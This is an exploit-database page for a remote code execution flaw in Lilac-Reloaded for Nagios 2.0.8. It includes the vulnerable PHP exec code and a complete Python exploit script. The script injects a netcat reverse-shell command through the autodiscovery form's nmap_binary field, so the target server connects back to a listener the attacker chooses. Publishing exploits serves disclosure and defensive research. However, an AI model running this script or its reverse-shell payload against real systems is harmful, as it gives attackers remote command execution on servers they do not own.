---
title: Lilac-Reloaded For Nagios 2.0.8 Remote Code Execution
url: https://cxsecurity.com/issue/WLB-2023040075
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-24
fetch_date: 2025-10-04T11:31:26.340297
---

# Lilac-Reloaded For Nagios 2.0.8 Remote Code Execution

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Lilac-Reloaded For Nagios 2.0.8 Remote Code Execution** **2023.04.23**  Credit:  **[Zoltan Padanyi](https://cxsecurity.com/author/Zoltan%2BPadanyi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

#!/usr/bin/env python
"""
# Exploit Title: Lilac-Reloaded for Nagios 2.0.8 - Remote Code Execution (RCE)
# Google Dork: N/A
# Date: 2023-04-13
# Exploit Author: max / Zoltan Padanyi
# Vendor Homepage: https://exchange.nagios.org/directory/Addons/Configuration/Lilac-2DReloaded/visit
# Software Link: https://sourceforge.net/projects/lilac--reloaded/files/latest/download
# Version: 2.0.8
# Tested on: Debian 7.6
# CVE : N/A
The autodiscovery feature lacks any kind of input filtering, so we can add our own commands there terminated with a ;
Use at your own risk!
RCA - wild exec is ongoing without any filtering
in library/Net/Traceroute.php
181 function \_setTraceroutePath($sysname)
182 {
183 $status = '';
184 $output = array();
185 $traceroute\_path = '';
186
187 if ("windows" == $sysname) {
188 return "tracert";
189 } else {
190 $traceroute\_path = exec("which traceroute", $output, $status);
[...]
257 function traceroute($host)
258 {
259
260 $argList = $this->\_createArgList();
261 $cmd = $this->\_traceroute\_path." ".$argList[0]." ".$host." ".$argList[1];
262 exec($cmd, $this->\_result);
"""
import requests
import argparse
parser = argparse.ArgumentParser()
parser.add\_argument("-u", "--url", help="The full path of the autodiscover.php in lilac (i.e. http://127.0.0.1/lilac/autodiscovery.php", required=True)
parser.add\_argument("-i", "--ip", help="Listener IP", required=True)
parser.add\_argument("-p", "--port", help="Listener port", required=True, type=int)
args = parser.parse\_args()
rev\_shell = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.ip} {args.port} >/tmp/f;"
body = {"request":"autodiscover","job\_name":"HackThePlanet","job\_description":"HackThePlanet","nmap\_binary":rev\_shell,"default\_template":"","target[2]":"1.1.1.1"}
try:
r = requests.get(args.url)
if r.ok:
print("[+] URL looks good...moving forward...")
print("[+] Sending exploit in...")
r = requests.post(args.url,data=body)
if r.ok:
print("[+] Got HTTP 200, check your listener!")
else:
print("[-] Some kind of error happened, check the http response below!")
print(r.text)
except Exception as e:
print("General exception: " + str(e))

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040075)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top